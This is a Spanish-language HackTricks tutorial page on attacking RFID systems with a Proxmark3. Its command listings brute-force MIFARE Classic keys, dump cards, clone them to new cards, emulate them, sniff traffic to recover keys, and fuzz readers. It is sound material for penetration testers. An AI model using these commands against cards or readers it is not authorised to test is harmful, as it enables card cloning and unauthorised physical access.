# Proxmark 3

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Atacando Sistemas RFID con Proxmark3

Lo primero que necesitas es tener un [**Proxmark3**](https://proxmark.com) e [**instalar el software y sus dependencias**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacando MIFARE Classic 1KB

Tiene **16 sectores**, cada uno con **4 bloques** y cada bloque contiene **16B**. El UID está en el sector 0 bloque 0 (y no se puede alterar).\
Para acceder a cada sector necesitas **2 claves** (**A** y **B**) que se almacenan en el **bloque 3 de cada sector** (sector trailer). El sector trailer también almacena los **bits de acceso** que dan permisos de **lectura y escritura** en **cada bloque** utilizando las 2 claves.\
2 claves son útiles para dar permisos de lectura si conoces la primera y de escritura si conoces la segunda (por ejemplo).

Se pueden realizar varios ataques
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
El Proxmark3 permite realizar otras acciones como **escuchar** una **comunicación de Tag a Lector** para intentar encontrar datos sensibles. En esta tarjeta, podrías simplemente husmear la comunicación y calcular la clave utilizada porque las **operaciones criptográficas utilizadas son débiles** y al conocer el texto plano y cifrado puedes calcularlo (herramienta `mfkey64`).

### Comandos en Bruto

A veces, los sistemas IoT utilizan **etiquetas no marcadas o no comerciales**. En este caso, puedes usar Proxmark3 para enviar **comandos en bruto personalizados a las etiquetas**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con esta información podrías intentar buscar información sobre la tarjeta y la forma de comunicarte con ella. Proxmark3 permite enviar comandos en bruto como: `hf 14a raw -p -b 7 26`

### Scripts

El software de Proxmark3 viene con una lista predefinida de **scripts de automatización** que puedes utilizar para realizar tareas simples. Para recuperar la lista completa, utiliza el comando `script list`. A continuación, utiliza el comando `script run`, seguido del nombre del script:
```
proxmark3> script run mfkeys
```
Puedes crear un script para **fuzzear lectores de etiquetas**, copiando los datos de una **tarjeta válida** solo escribe un **script Lua** que **aleatorice** uno o más **bytes aleatorios** y verifica si el **lector se bloquea** con cualquier iteración.

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al **grupo de Telegram** o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
